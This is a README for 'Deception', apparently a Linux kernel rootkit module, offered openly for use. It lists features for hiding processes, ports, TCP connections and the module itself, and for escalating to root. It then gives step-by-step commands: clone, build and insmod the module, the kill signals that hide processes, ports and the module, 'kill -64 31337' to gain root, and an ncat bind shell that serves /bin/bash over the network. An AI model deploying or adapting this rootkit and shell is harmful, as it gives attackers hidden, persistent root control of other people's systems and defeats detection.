# Deception Rootkit


<b>* Process Hiding:</b> Hide multiple processes. You can unhide them one at a time or all at once.<br>
<b>* Port Hiding:</b> Hide multiple ports using kill signals. Unhide them one at a time or all at once.<br>
<b>* TCP Connection Hiding:</b> Hide TCP connections on any port based on IPv6 address.<br>
<b>* Module Hiding:</b> Hides itself when loaded into the kernel. Removes it from /sys/module and /proc/modules<br>
<b>* Privilege Escalation:</b> The correct kill signal gives root privileges.<br>
<b>* Kill Signal Obfuscation:</b> You choose the ID number of GET_ROOT and MOD_REVEAL.<br><br>

Clone this repository, run make and insert module
```
git clone https://github.com/carls0n/deception
```
```
make
```
```
sudo insmod deception.ko
```
Hide a process - hide as many processes as you want! Toggles visible/hidden.
```
kill -62 4214
```
Unhide all processes
```
kill -62 0
```
Hide a port. Hide as many ports as you want! Toggles visible/hidden.
```
kill -61 8080
```
Unhide all ports
```
kill -61 0
```
Toggle module visibility/hidden. PID can be configured in source code
```
kill -63 8000
```
To remove the module once it has been unhidden
```
sudo rmmod -f deception
```
Gain root privileges. PID can be configured in source code
```
kill -64 31337
```
Also, Your IPv6 address can be hidden from any tcp connection. Configurable in source code. Useful for a IPv6 only connection such as ncat (part of nmap package)
```
/usr/bin/ncat -6 --ssl -k -l 8080 -e /bin/bash
```

